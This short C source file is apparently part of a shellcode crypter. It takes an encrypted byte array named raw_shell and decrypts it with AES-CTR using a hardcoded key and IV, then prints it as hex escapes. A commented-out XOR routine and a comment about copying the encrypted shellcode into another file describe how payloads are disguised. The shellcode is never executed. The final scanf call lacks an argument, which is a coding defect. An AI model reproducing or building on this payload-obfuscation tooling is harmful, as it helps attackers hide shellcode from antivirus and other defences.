#include <stdio.h>
#include "aes.h"
#define CTR 1
int main(int argc, char*argv[]) {
uint8_t raw_shell[] =  "\xec\xec\xfc\x5d\x5e\xc9\x7a\xd0\xbb\xb1\x70\xb3\xd4\x15\x02";
/*int i;
char key = '!';
printf("encrypted buffer\n");
for ( i = 0; i < sizeof(raw_shell); i++)
{
    printf("\\x%02x", raw_shell[i]^key);//xor encryption*/ 

// copy the encrypted shellcode to the shellcode variable in new.c file
struct AES_ctx ctx;
uint8_t key[] = "@yj$4(bM3geUA$WT";
uint8_t  iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
AES_init_ctx_iv(&ctx, key, iv);
AES_CTR_xcrypt_buffer(&ctx,raw_shell,sizeof(raw_shell));
printf("Decrypted buffer:\n");

	for (int i = 0; i < sizeof(raw_shell) - 1; i++) {
		printf("\\x%02x", raw_shell[i]);

	}
printf("\n");
printf("press any key");
scanf("%d");
}